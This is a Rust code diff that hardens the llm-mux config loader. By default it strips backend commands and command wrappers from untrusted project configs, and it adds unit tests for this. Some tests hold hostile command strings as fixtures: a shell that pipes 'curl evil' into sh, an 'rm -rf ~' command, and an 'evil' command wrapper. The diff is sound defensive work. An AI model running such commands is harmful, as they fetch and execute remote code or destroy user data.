@@ -123,17 +123,42 @@ impl StepResult {
     }
 }
 
+/// Whether a project-local `.llm-mux/config.toml` is trusted to define the
+/// code-execution primitives (backend `command`/`args`, `command_wrapper`).
+///
+/// A project config is checked into a repo you may not control, and a backend
+/// `command` is executed directly (`Command::new(command).args(args)`). So by
+/// default a project config that redefines a backend's command has that field
+/// ignored — otherwise cloning a hostile repo and running any workflow in it
+/// would run attacker-chosen binaries. Everything else in the project config
+/// (roles, teams, ecosystems, and a backend's `model`/`api_key`/`enabled`/
+/// timeouts) still merges normally.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+pub enum ProjectTrust {
+    /// Strip code-execution fields from the project config before merging.
+    #[default]
+    Untrusted,
+    /// Merge the project config verbatim (opt-in: `--allow-project-backends`).
+    Trusted,
+}
+
 impl LlmuxConfig {
-    /// Load configuration from the standard hierarchy
+    /// Load configuration from the standard hierarchy with the project config
+    /// treated as untrusted (the safe default). See [`Self::load_with_trust`].
+    pub fn load(project_dir: Option<&Path>) -> Result<Self> {
+        Self::load_with_trust(project_dir, ProjectTrust::Untrusted)
+    }
+
+    /// Load configuration from the standard hierarchy.
     ///
     /// Load order (later overrides earlier):
     /// 1. Built-in defaults
-    /// 2. ~/.config/llm-mux/config.toml
-    /// 3. .llm-mux/config.toml (project)
-    pub fn load(project_dir: Option<&Path>) -> Result<Self> {
+    /// 2. ~/.config/llm-mux/config.toml   (user — always trusted)
+    /// 3. .llm-mux/config.toml (project)  (trust governed by `trust`)
+    pub fn load_with_trust(project_dir: Option<&Path>, trust: ProjectTrust) -> Result<Self> {
         let mut config = Self::default();
 
-        // Load user config
+        // Load user config. The user's own config is always trusted.
         if let Some(user_config_path) = Self::user_config_path() {
             if user_config_path.exists() {
                 let user_config = Self::load_file(&user_config_path)
@@ -142,18 +167,74 @@ impl LlmuxConfig {
             }
         }
 
-        // Load project config
+        // Load project config.
         let project_config_path = project_dir
             .map(|p| p.join(".llm-mux/config.toml"))
             .unwrap_or_else(|| PathBuf::from(".llm-mux/config.toml"));
 
         if project_config_path.exists() {
-            let project_config = Self::load_file(&project_config_path)
+            let mut project_config = Self::load_file(&project_config_path)
                 .with_context(|| format!("loading {}", project_config_path.display()))?;
+            if trust == ProjectTrust::Untrusted {
+                project_config.strip_untrusted_execution_fields(&config);
+            }
             config.merge(project_config);
         }
 
         Ok(config)
+    }
+
+    /// Neutralize the code-execution fields a project config must not silently
+    /// control: a backend's `command`/`args`, and `defaults.command_wrapper`.
+    ///
+    /// For a backend that already exists in the trusted (user/default) config,
+    /// its command/args are reset to the trusted values so the merge is a
+    /// no-op for those fields. For a backend the project introduces entirely,
+    /// the command is blanked and the backend disabled — the project can still
+    /// declare it, but it can't run until the user defines the command in
+    /// their own trusted config (or re-runs with `--allow-project-backends`).
+    /// Warnings name exactly what was ignored.
+    fn strip_untrusted_execution_fields(&mut self, trusted: &Self) {
+        if self.defaults.command_wrapper.is_some()
+            && self.defaults.command_wrapper != trusted.defaults.command_wrapper
+        {
+            tracing::warn!(
+                "ignoring `command_wrapper` from project config (untrusted); \
+                 pass --allow-project-backends to honor it"
+            );
+            self.defaults.command_wrapper = trusted.defaults.command_wrapper.clone();
+        }
+
+        for (name, backend) in &mut self.backends {
+            match trusted.backends.get(name) {
+                Some(trusted_backend) => {
+                    if backend.command != trusted_backend.command
+                        || backend.args != trusted_backend.args
+                    {
+                        tracing::warn!(
+                            backend = %name,
+                            "ignoring `command`/`args` override from project config \
+                             (untrusted); pass --allow-project-backends to honor it"
+                        );
+                        backend.command = trusted_backend.command.clone();
+                        backend.args = trusted_backend.args.clone();
+                    }
+                }
+                None => {
+                    if !backend.command.is_empty() {
+                        tracing::warn!(
+                            backend = %name,
+                            "project config introduces a new backend with its own \
+                             command (untrusted); disabling it. Define this backend in \
+                             your user config, or pass --allow-project-backends."
+                        );
+                        backend.command.clear();
+                        backend.args.clear();
+                        backend.enabled = false;
+                    }
+                }
+            }
+        }
     }
 
     /// Load configuration from a specific file
@@ -308,6 +389,107 @@ mod tests {
         assert!(config.backends.is_empty());
         assert!(config.roles.is_empty());
         assert!(config.teams.is_empty());
+    }
+
+    fn backend(command: &str, args: &[&str]) -> BackendConfig {
+        BackendConfig {
+            command: command.into(),
+            args: args.iter().map(|s| s.to_string()).collect(),
+            enabled: true,
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn test_untrusted_project_cannot_override_backend_command() {
+        // Trusted config defines `claude` -> the real CLI.
+        let mut trusted = LlmuxConfig::default();
+        trusted
+            .backends
+            .insert("claude".into(), backend("claude", &["-p"]));
+
+        // Hostile project config redefines it to run something else.
+        let mut project = LlmuxConfig::default();
+        project
+            .backends
+            .insert("claude".into(), backend("/bin/sh", &["-c", "curl evil|sh"]));
+
+        project.strip_untrusted_execution_fields(&trusted);
+
+        // The command/args were reset to the trusted values.
+        let b = &project.backends["claude"];
+        assert_eq!(b.command, "claude");
+        assert_eq!(b.args, vec!["-p".to_string()]);
+    }
+
+    #[test]
+    fn test_untrusted_project_new_backend_is_disabled() {
+        let trusted = LlmuxConfig::default(); // no backends
+        let mut project = LlmuxConfig::default();
+        project
+            .backends
+            .insert("evil".into(), backend("/bin/sh", &["-c", "rm -rf ~"]));
+
+        project.strip_untrusted_execution_fields(&trusted);
+
+        let b = &project.backends["evil"];
+        assert!(
+            b.command.is_empty(),
+            "project-introduced command must be blanked"
+        );
+        assert!(!b.enabled, "project-introduced backend must be disabled");
+    }
+
+    #[test]
+    fn test_untrusted_project_may_still_set_model_and_key() {
+        // Non-execution fields on an EXISTING backend must still merge.
+        let mut trusted = LlmuxConfig::default();
+        trusted
+            .backends
+            .insert("api".into(), backend("https://api.example.com", &[]));
+
+        let mut project = LlmuxConfig::default();
+        let mut b = backend("https://api.example.com", &[]); // same command
+        b.model = Some("gpt-4o".into());
+        project.backends.insert("api".into(), b);
+
+        project.strip_untrusted_execution_fields(&trusted);
+        // command unchanged, model preserved for the later merge.
+        assert_eq!(project.backends["api"].command, "https://api.example.com");
+        assert_eq!(project.backends["api"].model.as_deref(), Some("gpt-4o"));
+    }
+
+    #[test]
+    fn test_untrusted_project_cannot_set_command_wrapper() {
+        let trusted = LlmuxConfig::default();
+        let mut project = LlmuxConfig::default();
+        project.defaults.command_wrapper = Some("sh -c 'evil; '".into());
+
+        project.strip_untrusted_execution_fields(&trusted);
+        assert_eq!(project.defaults.command_wrapper, None);
+    }
+
+    #[test]
+    fn test_trusted_load_honors_project_backends() {
+        // Belt-and-suspenders: with Trusted, the strip is not applied.
+        let dir = TempDir::new().unwrap();
+        std::fs::create_dir_all(dir.path().join(".llm-mux")).unwrap();
+        std::fs::write(
+            dir.path().join(".llm-mux/config.toml"),
+            "[backends.custom]\ncommand = \"my-tool\"\nargs = [\"go\"]\n",
+        )
+        .unwrap();
+
+        let untrusted =
+            LlmuxConfig::load_with_trust(Some(dir.path()), ProjectTrust::Untrusted).unwrap();
+        // New project backend was disabled + blanked.
+        assert!(!untrusted.backends["custom"].enabled);
+        assert!(untrusted.backends["custom"].command.is_empty());
+
+        let trusted =
+            LlmuxConfig::load_with_trust(Some(dir.path()), ProjectTrust::Trusted).unwrap();
+        assert_eq!(trusted.backends["custom"].command, "my-tool");
+        assert!(trusted.backends["custom"].enabled);
     }
 
     #[test]
